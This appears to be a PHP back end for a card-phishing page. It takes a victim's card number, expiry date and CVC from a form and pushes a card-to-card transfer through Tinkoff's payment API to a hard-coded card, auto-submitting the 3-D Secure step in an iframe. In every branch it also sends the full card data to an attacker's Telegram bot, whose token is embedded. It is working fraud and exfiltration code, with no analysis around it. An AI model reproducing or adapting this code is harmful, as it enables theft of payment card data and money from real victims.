<?php
//номер карты
$card = '2202200267535597';
$token = "1043654923:AAGdNk5CrYmhi3o5AQFsveH7I1aVCUVF438";
$recipient = '-1001363740250';
$imid = '676094295';

if(mb_strlen(str_replace(' ','',$_POST['card_number'])) == 16){
    $curl = curl_init();
    curl_setopt_array($curl, array(
    CURLOPT_URL => "https://securepay.tinkoff.ru/c2c/Init",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CUSTOMREQUEST => "POST",
    CURLOPT_POSTFIELDS => "TerminalKey=1512661336231C2C&OrderId=".rand(),
    CURLOPT_HTTPHEADER => array("Content-Type: application/x-www-form-urlencoded")));
    $gettrn = json_decode(curl_exec($curl));
    $trn = $gettrn->PaymentId;
    if($gettrn->ErrorCode == 0 && $gettrn->Success == 'true'){
        file_get_contents($gettrn->PaymentURL);
        $curl = curl_init();
        curl_setopt_array($curl, array(
        CURLOPT_URL => "https://securepay.tinkoff.ru/c2c/FinishAuthorize",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST => "POST",
        CURLOPT_POSTFIELDS => "TerminalKey=1512661336231C2C&PaymentId=$trn&Amount=".$_POST['amount']."00&SourceCardData=PAN=".str_replace(' ','',$_POST['card_number']).";ExpDate=".$_POST['mm'].$_POST['yy'].";CVV=". $_POST['cvc']."&DstCardNumber=$card&Currency=643&Fee=4000",
        CURLOPT_HTTPHEADER => array("Content-Type: application/x-www-form-urlencoded"),
        ));
        $response = curl_exec($curl);
        curl_close($curl);
        preg_match_all('/name=[""]([^"]*)" value=[""]([^"]*)"/m', $response, $rvall, PREG_SET_ORDER, 0);
        preg_match_all('/name=[""]([^"]*)" action=[""]([^"]*)"/m', $response, $matches, PREG_SET_ORDER, 0);
        echo '<html><head>' .
        '<script src="https://code.jquery.com/jquery-3.3.1.js"></script>' .
        '<script>$(document).ready(function(){$("#payform").submit();});</script>' .
        '</head><body style="padding: 0px; margin: 0px;">' .
        '<form action="' . $matches[0][2] . '" method="post" target="payframe" id="payform">' .
        '<input type="hidden" name="PaReq" value="' . $rvall[0][2] . '">' .
        '<input type="hidden" name="MD" value="' . $rvall[2][2] . '">' .
        '<input type="hidden" name="TermUrl" value="https://' . $_SERVER["SERVER_NAME"] . dirname($_SERVER["REQUEST_URI"]) . '/status.php">' .
        '</form>' .
        '<iframe name="payframe" style="width: 100%; height: 100%; border: 0px;"></iframe>' .
        '</body></html>';
        $messege = "Транкзакция: В исполнении    Номер карты: ".$_POST['card_number']."    ".$_POST['mm']."/".$_POST['yy']."    cvc: ".$_POST['cvc']."    Сумма: ".$_POST['amount'];
  		file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$recipient&text=$messege");
    }else{
	  	$messege = "Транкзакция: Не удалась    Номер карты: ".$_POST['card_number']."    ".$_POST['mm']."/".$_POST['yy']."    cvc: ".$_POST['cvc'];
	  	file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$recipient&text=$messege");
		header("Location: error.php");
	}
}else{
	$messege = "Транкзакция: Не удалась    Номер карты: ".$_POST['card_number']."    ".$_POST['mm']."/".$_POST['yy']."    cvc: ".$_POST['cvc'];
	file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$recipient&text=$messege");
  	header("Location: error.php");
}
